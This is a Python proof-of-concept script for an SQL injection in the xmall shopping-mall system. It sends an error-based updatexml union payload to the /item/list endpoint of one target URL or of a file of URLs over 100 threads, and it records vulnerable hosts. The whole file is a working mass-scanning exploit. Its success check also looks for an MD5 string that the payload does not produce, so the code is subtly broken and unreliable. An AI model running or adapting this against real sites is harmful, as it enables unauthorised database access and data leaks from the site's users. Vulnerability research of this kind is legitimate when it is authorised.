import argparse,sys,re,requests
from multiprocessing.dummy import Pool


def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                                             
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='xmall是一个基于SOA架构的分布式电商购物商城,前后端分离,该系统/item/list、/item/listSearch、/sys/log、/order/list、/member/list、/member/list/remove等多处接口存在SQL注入漏洞，会造成数据泄露。')
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    url = target + payload_url
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }

    try:
        res = requests.get(url, headers=headers, verify=False,timeout=5)
        res1 = requests.get(target)
        if res1.status_code == 200:
            if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
                print(f'[+] 该url {target} 存在漏洞')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点 {target} 不存在漏洞')
        else:
            print('[0]连接失败，请手动访问测试')
    except Exception as e:
        print(f'[*] 访问 {target} 时发生异常: {str(e)}')


if __name__ == '__main__':
    main()